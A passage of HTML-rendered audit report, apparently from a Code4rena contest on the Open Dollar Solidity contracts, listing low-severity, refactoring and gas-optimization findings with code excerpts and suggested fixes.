class=\"mtk1\"> = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getQuoteAtTick</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">096</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">tick</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">097</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">: </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">098</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">: </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">099</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">: </span><span class=\"mtk12\">quoteToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_result</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_parseResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<h2 id=\"n-04-remove-if-extrasurplusreceiver--address0-revert-acceng_nullsurplusreceiver-redundant-check\" style=\"position:relative;\"><a href=\"#n-04-remove-if-extrasurplusreceiver--address0-revert-acceng_nullsurplusreceiver-redundant-check\" aria-label=\"n 04 remove if extrasurplusreceiver  address0 revert acceng_nullsurplusreceiver redundant check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Remove <code>if (extraSurplusReceiver == address(0)) revert AccEng_NullSurplusReceiver();</code> redundant check</h2>\n<p>There is 1 instance of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/AccountingEngine.sol#L225\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/AccountingEngine.sol#L225</a></p>\n<p>Remove check below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">extraSurplusReceiver</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AccEng_NullSurplusReceiver</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>Check already <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/AccountingEngine.sol#L201\">done before in the same function</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">extraSurplusReceiver</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AccEng_NullSurplusReceiver</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<h2 id=\"r-01-consider-modifying-the-build-function-which-allows-anyone-to-create-an-odproxy-for-any-user\" style=\"position:relative;\"><a href=\"#r-01-consider-modifying-the-build-function-which-allows-anyone-to-create-an-odproxy-for-any-user\" aria-label=\"r 01 consider modifying the build function which allows anyone to create an odproxy for any user permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-01] Consider modifying the build() function which allows anyone to create an ODProxy for any user</h2>\n<p>There is 1 instance of this issue:</p>\n<p>The build() function on Line 90 below allows anyone to create an ODProxy for any user. Although this is a convenient method, it should still implement some sort of approval mechanism where the caller can deploy an ODProxy only on the approval of the user (for whom the proxy is being created). That way the method is less prone to frontrunning attacks that could DOS the user’s call (since the Proxy would already be created but user call fails when trying to build one).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Vault721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">build</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">_isNotProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProxyAlreadyExist</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_build</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">86</span><span class=\"mtk1\">:   </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">87:    * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> allows user without an ODProxy to deploy a new ODProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">88:    */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:   </span><span class=\"mtk3\">//@audit Low - allows anyone to build an ODProxy for any user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">build</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">_isNotProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProxyAlreadyExist</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_build</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">93</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<h2 id=\"r-02-use-user-instead-of-usr-in-mappings-to-improve-readability\" style=\"position:relative;\"><a href=\"#r-02-use-user-instead-of-usr-in-mappings-to-improve-readability\" aria-label=\"r 02 use user instead of usr in mappings to improve readability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-02] Use <code>user</code> instead of <code>usr</code> in mappings to improve readability</h2>\n<p>There are 2 instances of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L32C2-L34C110\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L32C2-L34C110</a></p>\n<p>Instead of <code>_usrSafes</code> use <code>_userSafes</code> and <code>_userSafesPerCollat</code> instead of <code>_usrSafesPerCollat</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">:   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeOwner</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">EnumerableSet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UintSet</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usrSafes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:   </span><span class=\"mtk3\">/// @notice Mapping of user addresses to their enumerable set of safes per collateral type</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">:   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeOwner</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_cType</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">EnumerableSet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UintSet</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usrSafesPerCollat</span><span class=\"mtk1\">; </span></span></span></code></pre>\n<h2 id=\"r-03-use-safeallow-and-handlerallow-instead-of-safecan-and-handlercan-to-better-match-the-intention-of-the-mappings\" style=\"position:relative;\"><a href=\"#r-03-use-safeallow-and-handlerallow-instead-of-safecan-and-handlercan-to-better-match-the-intention-of-the-mappings\" aria-label=\"r 03 use safeallow and handlerallow instead of safecan and handlercan to better match the intention of the mappings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-03] Use <code>safeAllow</code> and <code>handlerAllow</code> instead of <code>safeCan</code> and <code>handlerCan</code> to better match the intention of the mappings</h2>\n<p>There are 2 instances of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L39C1-L42C1\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L39C1-L42C1</a></p>\n<p>These mappings represent the allowances the <code>_owner</code> gives to other addresses. To suit this intention of allowance, it would be better to rename the mappings to <code>safeAllow</code> and <code>handlerAllow</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">:   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_caller</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safeCan</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:   </span><span class=\"mtk3\">/// @inheritdoc IODSafeManager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeHandler</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_caller</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">handlerCan</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"r-04-add-brackets-around-10--multiplier-to-improve-code-readability-and-provide-clarity-in-which-operation-takes-precedence-first\" style=\"position:relative;\"><a href=\"#r-04-add-brackets-around-10--multiplier-to-improve-code-readability-and-provide-clarity-in-which-operation-takes-precedence-first\" aria-label=\"r 04 add brackets around 10  multiplier to improve code readability and provide clarity in which operation takes precedence first permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-04] Add brackets around <code>10 ** multiplier</code> to improve code readability and provide clarity in which operation takes precedence first</h2>\n<p>There is 1 instance of this issue:</p>\n<p>Instead of this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">CamelotRelayer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_parseResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteResult</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_result</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteResult</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<p>Use this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">CamelotRelayer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_parseResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteResult</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_result</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteResult</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/140#issuecomment-1788045525\">pi0neerpat (OpenDollar) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/140#issuecomment-1792916764\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Note that the warden also has <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/288\">#288</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/172\">#172</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/104\">#104</a> as low severity findings.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 8 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/386\">report highlighted below</a> by <strong>0xVolcano</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/311\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/357\">0x11singh99</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/349\">JCK</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/344\">naman1778</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/280\">dharma09</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/271\">unique</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/180\">nailkhalimov</a>.</em></p>\n<h2 id=\"summary-2\" style=\"position:relative;\"><a href=\"#summary-2\" aria-label=\"summary 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p>The findings from the bot should be reviewed as they contain some solid issues.<br>\nThe following findings were missed by the bot (in some cases, bot has identified some instances but missed others, I try to explain whenever this happens).</p>\n<p>Gas estimates are done using the opcodes involved since most of this functions were not covered by tests.</p>\n<h2 id=\"g-01-using-immutable-on-variables-that-are-only-set-in-the-constructor-and-never-after-save-147k-gas\" style=\"position:relative;\"><a href=\"#g-01-using-immutable-on-variables-that-are-only-set-in-the-constructor-and-never-after-save-147k-gas\" aria-label=\"g 01 using immutable on variables that are only set in the constructor and never after save 147k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Using immutable on variables that are only set in the constructor and never after (Save 14.7K Gas)</h2>\n<p>Use immutable if you want to assign a permanent value at construction. Use constants if you already know the permanent value. Both get directly embedded in bytecode, saving SLOAD.</p>\n<p><strong>Note: These were not found by the bot</strong></p>\n<p><strong>Total Instances: 7</strong><br>\n<strong>Gas Per Instance: 2.1 K</strong><br>\n<strong>Total Gas Saved: 14.7K gas</strong></p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/AccountingEngine.sol#L58\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/AccountingEngine.sol#L58</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AccountingEngine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">AccountingEngineParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a 